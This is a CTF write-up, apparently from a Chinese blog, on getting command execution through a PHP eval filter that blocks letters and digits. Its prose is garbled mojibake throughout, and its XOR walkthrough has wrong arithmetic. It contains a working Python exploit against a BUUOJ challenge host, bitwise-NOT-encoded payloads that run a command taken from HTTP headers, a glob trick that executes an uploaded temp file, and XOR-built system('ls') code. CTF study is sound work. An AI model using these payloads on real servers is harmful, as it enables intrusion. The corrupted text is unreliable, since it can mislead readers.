å¾ˆå¥½æˆ‘ä»¬ç›´æ¥å°è¯•ä¿®æ”¹uaå¤´ï¼Œå› ä¸ºè¿™é‡Œhostè‚¯å®šä¸èƒ½ä¿®æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨nextå‡½æ•°ä½¿æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä½ åŸå‹ä¸º: system(next(getallheaders())) cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); uaå¤´è¾“å…¥ls /æŸ¥çœ‹flagæ‰€åœ¨åœ° æ‰¾åˆ°flag åŸå‹ä¸º: system(next(getallheaders())) cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); uaå¤´è¾“å…¥cat /flagæ‰€åœ¨åœ°flll1114gggggg æ‹¿åˆ°flagï¼Œéº»çƒ¦çš„ç‚¹åœ¨äºæ¯æ¬¡bpæŠ“åŒ…éƒ½è¦é‡æ–°çˆ†ç ´ä¸€ä¸‹éªŒè¯ç ï¼Œä¸è¿‡æœ‰ä¸ªä½¬å†™å‡ºäº†expï¼Œå¯ä»¥å…¨è‡ªåŠ¨ï¼Œå¦‚ä¸‹ import hashlib import re import requests import sys url = 'http://01bca480-d4fd-4597-a13a-a9829e724683.node4.buuoj.cn:81/' session = requests.session() # 1 md5 è§£ç  r = session.get( url=url, ) md5_value = re.findall(r'if:substr\\(md5\\(\\$code\\),0,5\\)==(.+?)\"', r.text)[0] code = '' def md5(s): return hashlib.md5(s.encode()).hexdigest() def demd5(code):#çˆ†ç ´md5 for i in range(1, 9999999): if md5(str(i)).startswith(code): print('[*]code:', i) code = i break return code code = demd5(md5_value) # 2 å‘é€payload cmd = '[~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));' raw_data = f'code={code}&amp;cmd={cmd}' r = session.post( url=url, data=raw_data, allow_redirects=False, headers={ 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'tac /*', # æ‰§è¡Œçš„ä»£ç  } ) print('[*]', r.text) # phpinfo(): [~%8F%97%8F%96%91%99%90][~%CF](); #æŸ¥çœ‹shellåœ¨ç¬¬å‡ ä¸ªï¼š # var_dump(getallheaders())ï¼š [~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()); #è¿”å›shell # var_dump(next(getallheaders())): [~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]())); #æ‰§è¡Œshell # system(next(getallheaders())): [~%8C%86%8C%8B%9A%92][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]())); è¿™é‡Œå‘¢åœ¨è·Ÿç€wpå­¦ä¹ ä¸€ä¸‹ä¸Šè¿°payloadçš„æ„é€ åŸç†ï¼š ä¸Šè¿°payloadä¸­é‡‡ç”¨!%EFçš„åŸå› åœ¨äºä¸‹åˆ—è§£é‡Š php -r \"echo [1,2][0];\" è¿”å›1 æŠŠä»–çœ‹æˆä¸€ä¸ªæ•°ç»„ï¼Œç„¶åå–ä¸‹æ ‡ä¸º0çš„å†…å®¹ï¼Œç”±äºè¿™é‡Œä¸èƒ½ç”¨()ï¼Œæ‰€ä»¥æ”¹æˆäº†[][0]ï¼Œä¸è¿‡0ä¸è¿‡æ»¤äº†ï¼Œæ”¹æˆ!%FFï¼Œ%FFä¸ºTrueï¼ŒåŠ äº†æ„Ÿå¹å·å˜æˆäº†False æµ‹è¯• php -r \"echo [1,2][False];\" è¿”å›1 è¿™é‡Œfalseä»£è¡¨çš„æ˜¯0ï¼Œtrueè‚¯å®šå°±æ˜¯ä»£è¡¨1 æ•…æ­¤[phpinfo][0]=[phpinfo][!%FF]ä»£è¡¨çš„å°±æ˜¯phpinfoï¼Œè€Œ%FFè‚¯å®šä¸æ˜¯0ï¼Œä½†åœ¨!ä¹‹ä¸‹å°±æ˜¯0äº†ï¼Œè€Œè¿™é‡Œç”¨æ•°ç»„å»è¡¨ç¤ºåŸå› åœ¨äºï¼Œé¢˜ç›®ç»™çš„ç¬¬äºŒä¸ªæ­£åˆ™è¿‡æ»¤äº†æ‹¬å· è¿™é‡Œæˆ‘åˆå¯¹ç¬¬ä¸€ä¸ªæ­£åˆ™äº§ç”Ÿäº†ç–‘é—®ï¼Œä»–ä¸æ˜¯ä¼šæ£€æµ‹ä¼ å…¥å†…å®¹æ˜¯å¦åŒ…å«æ•°å­—å­—æ¯å—ï¼Œä½†æˆ‘ä¼ å…¥çš„è™½ç„¶æ˜¯ç¼–ç çš„ï¼Œä½†æ˜¾ç„¶æœ‰æ•°å­—ï¼Œä¹‹åæµ‹è¯•äº†ä¸€ç•ªå‘ç°ï¼Œå¦‚æœä¼ å…¥ç±»ä¼¼ä¸Šè¿°payloadï¼ˆç»è¿‡urlç¼–ç çš„ï¼‰ä¸è®ºæ˜¯getè¿˜æ˜¯postä¼ å‚ï¼Œéƒ½ä¼šç»è¿‡urlè§£ç ï¼Œè€Œæœ€ç»ˆå‡ºç°çš„éƒ½æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œå› æ­¤å®Œå…¨ä¸ä¼šè¢«æ­£åˆ™æ‰€åŒ¹é…åˆ°ã€‚ ä½†è‡³äºä¸Šè¿°çš„~%CFæˆ–è€…æ˜¯~%EFæˆ‘è¿˜æ˜¯ä¸ç†è§£æ˜¯ä»€ä¹ˆæ„æ€ï¼Œwpç»™å‡ºçš„è§£é‡Šæ˜¯ï¼š åŠ è¿™ä¸ª[~%CF]åªæ˜¯å› ä¸ºphp7çš„è§£ææ–¹å¼ï¼Œå½“ç„¶æ¢æˆå…¶ä»–çš„ä¹Ÿå¯ä»¥ä¾‹å¦‚[~%EF] æˆ‘å°è¯•è§£ç å‘ç°ä¹Ÿæ˜¯ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œä¸è¿‡è¿˜æ˜¯æ²¡æœ‰ç†è§£åœ¨æ­¤çš„å«ä¹‰ï¼Œæˆ‘æ„Ÿè§‰è¿˜æ˜¯!%FFå¥½ç†è§£ï¼Œä¸è¿‡è¿™é‡Œå°±å…ˆè®°å½•å§ï¼Œå¸Œæœ›æ—¥åå¯ä»¥æœ‰æ‰€è§£æƒ‘ å¥½è¿‡äº†å‡ åˆ†é’Ÿæˆ‘åˆæ¥äº†ï¼Œå¤šäºæˆ‘ä¸æ‡ˆçš„æ€è€ƒç»ˆäºæœ‰æ‰€è§£æƒ‘ï¼Œè¿™é‡Œæˆ‘ä¸€ç›´ä½¿ç”¨çš„hackbarè¿›è¡Œçš„ä¼ å‚ï¼Œå‘ç°æ€»æ˜¯ä¸æˆåŠŸï¼Œä½†å¦‚æœä½¿ç”¨æ˜æ–‡å­—ç¬¦phpinfoå°±å¯ä»¥ï¼Œæ¥ç€æˆ‘çªç„¶æƒ³åˆ°ç”¨bpè¯•è¯• å¦‚ä¸Šå›¾ï¼Œç«Ÿç„¶æˆåŠŸäº†ï¼Œæ¥ç€çœ‹åˆ°åˆšæŠ“åŒ…çš„æ—¶å€™å‘ç°å¦‚ä¸‹å›¾ æˆ‘ä»¬cmdçš„å†…å®¹è¢«urlç¼–ç äº†ï¼Œè€Œæˆ‘ä»¬åˆæ˜¯postä¼ å‚ï¼ŒæœåŠ¡å™¨æ˜¯ä¸ä¼šè‡ªåŠ¨å»è§£ç çš„ï¼ˆä¹Ÿå°±æ˜¯ä¸¤æ¬¡è§£ç ï¼‰æ•…æ­¤æˆ‘ä»¬éœ€è¦bpä¼ ä¸Šå»ï¼Œæ¥ç€æˆ‘å°è¯•æ¢æˆgetä¼ å‚ï¼ˆç”¨hackbarï¼‰ å¦‚ä¸Šå›¾æˆåŠŸäº†ï¼Œè¿™éªŒè¯äº†æˆ‘ä»¬ä¹‹å‰çš„æƒ³æ³•ã€‚niceï¼ï¼ï¼ æ— å‚RCEæ„é€ æ€æƒ³ï¼š pç¥æ˜¯æ ¹æ®å¦‚ä¸‹ä»£ç è¿›è¡Œçš„æ€è€ƒï¼š &lt;?php if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)&gt;35){ die(\"Long.\"); } if(preg_match(\"/[A-Za-z0-9_$]+/\",$code)){ die(\"NO.\"); } eval($code); }else{ highlight_file(__FILE__); } PHP7ä¸‹ php7ä¸­ä¿®æ”¹äº†è¡¨è¾¾å¼æ‰§è¡Œçš„é¡ºåºï¼šhttp://php.net/manual/zh/migration70.incompatible.php ï¼š PHP7å‰æ˜¯ä¸å…è®¸ç”¨($a)();è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡('phpinfo')();æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚ æ‰€ä»¥å¾ˆç®€å•äº†ï¼Œæ„é€ ä¸€ä¸ªå¯ä»¥ç”Ÿæˆphpinfoè¿™ä¸ªå­—ç¬¦ä¸²çš„PHPè¡¨è¾¾å¼å³å¯ã€‚payloadå¦‚ä¸‹ï¼ˆä¸å¯è§å­—ç¬¦ç”¨urlç¼–ç è¡¨ç¤ºï¼‰ï¼š (~%8F%97%8F%96%91%99%90)(); PHP5ä¸‹-pç¥çš„é¡¶å°–æ€è·¯ï¼ˆæ³¨é‡pç¥çš„æ€è€ƒæ–¹å¼ï¼‰ å¥½å§ï¼Œè¿™é‡Œæˆ‘è·Ÿç€pç¥æ˜¯èƒ½çœ‹æ‡‚ï¼Œä½†è¿™é‡Œå°±ä¸å¤ç°äº†ï¼Œæˆ‘ç›´æ¥ä¸è¦è„¸äº†ï¼ˆbushiå€Ÿç”¨pç¥å›¾ç‰‡ é¦–å…ˆpç¥å¯¹PHP5çš„getshellè¿›è¡Œäº†æ€è€ƒï¼š æˆ‘ä»¬ä½¿ç”¨docker run --rm -p 9090:80 -v pwd:/var/www/html php:5.6-apachæ¥è¿è¡Œä¸€ä¸ªphp5.6çš„webç¯å¢ƒã€‚ æ­¤æ—¶ï¼Œæˆ‘ä»¬å°è¯•ç”¨PHP7çš„payloadï¼Œå°†ä¼šå¾—åˆ°ä¸€ä¸ªé”™è¯¯ï¼š åŸå› å°±æ˜¯php5å¹¶ä¸æ”¯æŒè¿™ç§è¡¨è¾¾æ–¹å¼ã€‚ pç¥æ€è€ƒï¼š åœ¨æˆ‘åœ¨çŸ¥è¯†æ˜Ÿçƒé‡Œå‘å‡ºå¸–å­çš„æ—¶å€™ï¼Œå…¶å®è¿˜æ²¡æƒ³åˆ°å¦‚ä½•ç”¨PHP5è§£å†³é—®é¢˜ï¼Œä½†æˆ‘æœ‰è‡ªä¿¡è§£å†³å®ƒï¼Œæ‰€ä»¥å…ˆå‘äº†è¿™ä¸ªå°æŒ‘æˆ˜ã€‚åæ¥å…³ä¸Šç”µè„‘ä»”ç»†æƒ³æƒ³ï¼Œå‘ç°å½“æ€è·¯ç¦é”¢åœ¨ä¸€ä¸ªç‚¹çš„æ—¶å€™ï¼Œä½ å°†ä¼šé’»è¿›ç‰›è§’å°–ï¼›å½“ä½ ç”¨å¤§å±€è§‚æ¥çœ‹å¾…é—®é¢˜ï¼Œé—®é¢˜å°±è¿åˆƒè€Œè§£ã€‚ å½“ç„¶ï¼Œæˆ‘è§‰å¾—æˆ‘çš„æ–¹æ³•åº”è¯¥ä¸æ˜¯å”¯ä¸€çš„ï¼Œä¸è¿‡ä¸€ç›´æ²¡äººå‡ºæ¥å…¬å¸ƒç­”æ¡ˆï¼Œæˆ‘å°±å…ˆæŠ›é’»å¼•ç‰äº†ã€‚ å¤§éƒ¨åˆ†è¯­è¨€éƒ½ä¸ä¼šæ˜¯å•çº¯çš„é€»è¾‘è¯­è¨€ï¼Œä¸€é—¨å…¨åŠŸèƒ½çš„è¯­è¨€å¿…ç„¶éœ€è¦å’Œæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚æ“ä½œç³»ç»Ÿé‡ŒåŒ…å«çš„æœ€é‡è¦çš„ä¸¤ä¸ªåŠŸèƒ½å°±æ˜¯â€œshellï¼ˆç³»ç»Ÿå‘½ä»¤ï¼‰â€å’Œâ€œæ–‡ä»¶ç³»ç»Ÿâ€ï¼Œå¾ˆå¤šæœ¨é©¬ä¸è¿œæ§å…¶å®ä¹Ÿåªå®ç°äº†è¿™ä¸¤ä¸ªåŠŸèƒ½ã€‚ PHPè‡ªç„¶ä¹Ÿèƒ½å¤Ÿå’Œæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œâ€œåå¼•å·â€å°±æ˜¯PHPä¸­æœ€ç®€å•çš„æ‰§è¡Œshellçš„æ–¹æ³•ã€‚é‚£ä¹ˆï¼Œåœ¨ä½¿ç”¨PHPæ— æ³•è§£å†³é—®é¢˜çš„æƒ…å†µä¸‹ï¼Œä¸ºä½•ä¸è€ƒè™‘ç”¨â€œåå¼•å·â€+â€œshellâ€çš„æ–¹å¼æ¥getshellå‘¢ï¼Ÿ äºæ˜¯ä»–æƒ³åˆ°äº†php+shellæ‰“ç ´ç¦é”¢ å› ä¸ºåå¼•å·ä¸å±äºâ€œå­—æ¯â€ã€â€œæ•°å­—â€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†é—®é¢˜æ¥äº†ï¼šå¦‚ä½•åˆ©ç”¨æ— å­—æ¯ã€æ•°å­—ã€$çš„ç³»ç»Ÿå‘½ä»¤æ¥getshellï¼Ÿ å¥½åƒé—®é¢˜åˆå›åˆ°äº†åŸç‚¹ï¼šæ— å­—æ¯ã€æ•°å­—ã€$ï¼Œåœ¨shellä¸­ä»ç„¶æ˜¯ä¸€ä¸ªéš¾é¢˜ã€‚ æ­¤æ—¶æˆ‘æƒ³åˆ°äº†ä¸¤ä¸ªæœ‰è¶£çš„Linux shellçŸ¥è¯†ç‚¹ï¼š shellä¸‹å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œä»»æ„è„šæœ¬ Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿ ç¬¬ä¸€ç‚¹æ›¾åœ¨ã€Š å°å¯†åœˆé‡Œçš„é‚£äº›å¥‡æŠ€æ·«å·§ ã€‹éœ²å‡ºè¿‡ä¸€è§’ï¼Œä½†æˆ‘æ²¡ç»†è®²ã€‚.æˆ–è€…å«periodï¼Œå®ƒçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™. fileçš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ ç”¨. fileæ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸éœ€è¦fileæœ‰xæƒé™çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œé‚£ä¸å°±å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œå®ƒäº†å—ï¼Ÿ è¿™ä¸ªæ–‡ä»¶ä¹Ÿå¾ˆå¥½å¾—åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯/tmp/phpXXXXXXï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚ ç¬¬äºŒä¸ªéš¾é¢˜æ¥è¸µè€Œè‡³ï¼Œæ‰§è¡Œ. /tmp/phpXXXXXXï¼Œä¹Ÿæ˜¯æœ‰å­—æ¯çš„ã€‚æ­¤æ—¶å°±å¯ä»¥ç”¨åˆ°Linuxä¸‹çš„globé€šé…ç¬¦ï¼š *å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦ ?å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦ é‚£ä¹ˆï¼Œ/tmp/phpXXXXXXå°±å¯ä»¥è¡¨ç¤ºä¸º/*/?????????æˆ–/???/?????????ã€‚ ä½†æˆ‘ä»¬å°è¯•æ‰§è¡Œ. /???/?????????ï¼Œå´å¾—åˆ°å¦‚ä¸‹é”™è¯¯ï¼š è¿™æ˜¯å› ä¸ºï¼Œèƒ½å¤ŸåŒ¹é…ä¸Š/???/?????????è¿™ä¸ªé€šé…ç¬¦çš„æ–‡ä»¶æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬å¯ä»¥åˆ—å‡ºæ¥ï¼š å¯è§ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œçš„/tmp/phpcjggLCæ’åœ¨å€’æ•°ç¬¬äºŒä½ã€‚ç„¶è€Œï¼Œåœ¨æ‰§è¡Œç¬¬ä¸€ä¸ªåŒ¹é…ä¸Šçš„æ–‡ä»¶ï¼ˆå³/bin/run-partsï¼‰çš„æ—¶å€™å°±å·²ç»å‡ºç°äº†é”™è¯¯ï¼Œå¯¼è‡´æ•´ä¸ªæµç¨‹åœæ­¢ï¼Œæ ¹æœ¬ä¸ä¼šæ‰§è¡Œåˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ã€‚ æ€è·¯åˆé™·å…¥äº†åƒµå±€ï¼Œè™½ç„¶æ–¹å‘æ²¡é”™ã€‚ äºæ˜¯pç¥åˆå¼€å§‹æ·±å…¥ç†è§£globé€šé…ç¬¦ï¼ˆç¿»é˜…linuxæ–‡æ¡£ï¼‰ å¤§éƒ¨åˆ†åŒå­¦å¯¹äºé€šé…ç¬¦ï¼Œå¯èƒ½çŸ¥é“çš„éƒ½åªæœ‰*å’Œ?ã€‚ä½†å®é™…ä¸Šï¼Œé˜…è¯»Linuxçš„æ–‡æ¡£ï¼ˆ http://man7.org/linux/man-pages/man7/glob.7.html ï¼‰ï¼Œå¯ä»¥å­¦åˆ°æ›´å¤šæœ‰è¶£çš„çŸ¥è¯†ç‚¹ã€‚ å…¶ä¸­ï¼Œglobæ”¯æŒç”¨[^x]çš„æ–¹æ³•æ¥æ„é€ â€œè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå§¿åŠ¿å¹²æ‰/bin/run-partsï¼š æ’é™¤äº†ç¬¬4ä¸ªå­—ç¬¦æ˜¯-çš„æ–‡ä»¶ï¼ŒåŒæ ·æˆ‘ä»¬å¯ä»¥æ’é™¤åŒ…å«.çš„æ–‡ä»¶ï¼š ç°åœ¨å°±å‰©æœ€åä¸‰ä¸ªæ–‡ä»¶äº†ã€‚ä½†æˆ‘ä»¬è¦æ‰§è¡Œçš„æ–‡ä»¶ä»ç„¶æ’åœ¨æœ€åï¼Œä½†æˆ‘å‘ç°è¿™ä¸‰ä¸ªæ–‡ä»¶åä¸­éƒ½ä¸åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•ä¼¼ä¹è¡Œä¸é€šäº†ã€‚ ç»§ç»­é˜…è¯»globçš„å¸®åŠ©ï¼Œæˆ‘å‘ç°å¦ä¸€ä¸ªæœ‰è¶£çš„ç”¨æ³•ï¼šå°±è·Ÿæ­£åˆ™è¡¨è¾¾å¼ç±»ä¼¼ï¼Œglobæ”¯æŒåˆ©ç”¨[0-9]æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ã€‚ æˆ‘ä»¬å†æ¥çœ‹çœ‹ä¹‹å‰åˆ—å‡ºå¯èƒ½å¹²æ‰°æˆ‘ä»¬çš„æ–‡ä»¶ï¼š æ‰€æœ‰æ–‡ä»¶åéƒ½æ˜¯å°å†™ï¼Œåªæœ‰PHPç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å¤§å†™å­—æ¯ã€‚é‚£ä¹ˆç­”æ¡ˆå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œæˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è¡¨ç¤ºâ€œå¤§å†™å­—æ¯â€çš„globé€šé…ç¬¦ï¼Œå°±èƒ½ç²¾å‡†æ‰¾åˆ°æˆ‘ä»¬è¦æ‰§è¡Œçš„æ–‡ä»¶ã€‚ ç¿»å¼€asciiç è¡¨ï¼Œå¯è§å¤§å†™å­—æ¯ä½äº@ä¸[ä¹‹é—´ï¼š é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨[@-[]æ¥è¡¨ç¤ºå¤§å†™å­—æ¯ï¼š å½“ç„¶ï¼Œphpç”Ÿæˆä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯å¤§å†™å­—æ¯ï¼Œä¸è¿‡å¤šå°è¯•å‡ æ¬¡ä¹Ÿå°±è¡Œäº†ã€‚ æœ€åï¼Œæˆ‘ä¼ å…¥çš„codeä¸º?&gt;&lt;?=. /???/???[@-[];?&gt;ï¼Œå‘é€æ•°æ®åŒ…å¦‚ä¸‹ï¼š æˆåŠŸæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ 0x07 %FFä»¥åŠXORçš„æ€è€ƒ è¿™é‡Œå¯¹äºä¸Šè¿°payloadçš„æ„é€ ä»æœ‰è¯¸å¤šç–‘é—®ï¼Œæ•…æ­¤æœäº†è®¸å¤šæ–‡ç« åœ¨æ­¤å­¦ä¹ ä¸€æ³¢ã€‚ 7.1 PHPå¼‚æˆ–æµç¨‹ åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡çš„å€¼è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œä¼šå…ˆå°†ä¸¤ä¸ªå˜é‡çš„å€¼è½¬æ¢ä¸ºASCIIï¼Œå†å°†ASCIIè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œå¯¹ä¸¤å¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œï¼Œå†å°†ç»“æœè½¬ä¸ºASCIIï¼Œæœ€åå°†ASCIIè½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå³ä¸ºæœ€ç»ˆç»“æœã€‚ 7.2 å¼‚æˆ–è¿ç®—æ³•åˆ™ 0&amp;0=0ï¼›1&amp;1=0ï¼›0&amp;1=1ï¼›1&amp;0=1 ä¸¤ä¸ªäºŒè¿›åˆ¶æ•°ç›¸åŒæ—¶ï¼Œå¼‚æˆ–ä¸º0ï¼Œä¸åŒä¸º1 ä¾‹ï¼šphpä¸­çš„å­—ç¬¦ä¸²Aå’Œå­—ç¬¦ä¸²? &lt;?php echo \"A\"^\"?\"; //è¾“å‡ºï¼š~ /* (1) Açš„ASCIIå€¼ï¼š65 ?çš„ASCIIå€¼ï¼š77 (2) 65è½¬ä¸ºäºŒè¿›åˆ¶ï¼š1000001 90è½¬ä¸ºäºŒè¿›åˆ¶ï¼š0111111 (3) äºŒè¿›åˆ¶å¼‚æˆ–ç»“æœï¼š1111110 äºŒè¿›åˆ¶è½¬ä¸ºASCII:126 ASCIIè½¬ä¸ºå­—ç¬¦ä¸²ï¼š~ */ ?&gt; åˆ©ç”¨å¼‚æˆ–åˆ¶ä½œphpæ‰§è¡Œä»£ç ï¼š &lt;?php echo (\"&lt;\"^\"a\").\"&lt;br/&gt;\"; echo (\"?\"^\"d\").\"&lt;br/&gt;\"; echo (\"p\"^\"1\").\"&lt;br/&gt;\"; echo (\"h\"^\"1\").\"&lt;br/&gt;\"; echo (\"p\"^\"1\").\"&lt;br/&gt;\"; echo (\" \"^\"a\").\"&lt;br/&gt;\"; echo (\"s\"^\"1\").\"&lt;br/&gt;\"; echo (\"y\"^\"1\").\"&lt;br/&gt;\"; echo (\"s\"^\"2\").\"&lt;br/&gt;\"; echo (\"t\"^\"1\").\"&lt;br/&gt;\"; echo (\"e\"^\"1\").\"&lt;br/&gt;\"; echo (\"m\"^\"6\").\"&lt;br/&gt;\"; echo (\"(\"^\"a\").\"&lt;br/&gt;\"; echo (\"'\"^\"a\").\"&lt;br/&gt;\"; echo (\"l\"^\"1\").\"&lt;br/&gt;\"; echo (\"s\"^\"1\").\"&lt;br/&gt;\"; echo (\"'\"^\"a\").\"&lt;br/&gt;\"; echo (\")\"^\"a\").\"&lt;br/&gt;\"; echo (\";\"^\"a\").\"&lt;br/&gt;\"; echo (\"?\"^\"b\").\"&lt;br/&gt;\"; echo (\"&gt;\"^\"c\").\"&lt;br/&gt;\"; echo \"&lt;br/&gt;\"; echo (\"]\"^\"a\").\"&lt;br/&gt;\"; echo (\"[\"^\"d\").\"&lt;br/&gt;\"; echo (\"A\"^\"1\").\"&lt;br/&gt;\"; echo (\"Y\"^\"1\").\"&lt;br/&gt;\"; echo (\"A\"^\"1\").\"&lt;br/&gt;\"; echo (\"A\"^\"a\").\"&lt;br/&gt;\"; echo (\"B\"^\"1\").\"&lt;br/&gt;\"; echo (\"H\"^\"1\").\"&lt;br/&gt;\"; echo (\"A\"^\"2\").\"&lt;br/&gt;\"; echo (\"E\"^\"1\").\"&lt;br/&gt;\"; echo (\"T\"^\"1\").\"&lt;br/&gt;\"; echo (\"[\"^\"6\").\"&lt;br/&gt;\"; echo (\"I\"^\"a\").\"&lt;br/&gt;\"; echo (\"F\"^\"a\").\"&lt;br/&gt;\"; echo (\"]\"^\"1\").\"&lt;br/&gt;\"; echo (\"B\"^\"1\").\"&lt;br/&gt;\"; echo (\"F\"^\"a\").\"&lt;br/&gt;\"; echo (\"H\"^\"a\").\"&lt;br/&gt;\"; echo (\"Z\"^\"a\").\"&lt;br/&gt;\"; echo (\"]\"^\"b\").\"&lt;br/&gt;\"; echo (\"]\"^\"c\").\"&lt;br/&gt;\"; /*è¾“å‡º ] [ A Y A A B H A E T [ I F ] B F H Z ] ] &lt; ? p h p s y s t e m ( ' l s ' ) ; ? &gt; */ echo (\"AYAABHAET[IF]BFHZ]]\"^\"ad111a112116aa11aaabc\"); //æ²¡æœ‰è¾“å‡ºï¼Œå› ä¸º&lt;?php system('ls');?&gt;æ˜¯ä»£ç ï¼Œå·²ç»æ‰§è¡Œäº†ï¼Œä½†var_dump()ä¼šæ˜¾ç¤ºæœ‰21ä¸ªå­—ç¬¦ï¼Œæˆ–è€…ä¸¤è¾¹éƒ½åˆ é™¤å‰ä¸¤ä½ï¼Œå³å¯çœ‹åˆ°å€¼ ?&gt; åˆ¶ä½œæ—¶ï¼Œ^å·¦è¾¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„phpå­—ç¬¦ï¼Œå³è¾¹å¯è®¾ç½®1~9/a-z/A-Zï¼Œåªè¦å¾—åˆ°å¼‚æˆ–å‡ºæ¥çš„å€¼å³å¯ï¼Œä¹‹åå°†å¾—åˆ°çš„å€¼æ›¿æ¢åŸæ¥^å·¦è¾¹çš„å€¼ï¼Œå†æ¬¡å¼‚æˆ–ï¼Œå³ä¸ºä½ æƒ³è¦çš„phpå­—ç¬¦ã€‚å¦‚ä¸Šé¢çš„\"&lt;â€œ^â€œaâ€ï¼Œå¼‚æˆ–åçš„å€¼ä¸º]ï¼Œå†å°†åŸæ¥çš„&lt;æ›¿æ¢ä¸º]ï¼Œâ€]\"^\"a\"çš„ç»“æœä¸º&lt;ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»•è¿‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¼‚æˆ–æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å€¼ æ‰“CTFæ—¶ï¼Œè‹¥é‡åˆ°ç™½åå•è¿‡æ»¤ï¼Œä½†æ²¡æœ‰è¿‡æ»¤^ï¼Œå¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•ç»•è¿‡ï¼Œä¾‹å¦‚ï¼šhttp://x.x.x.x/?page=php://inputï¼Œå¦‚æœç›®æ 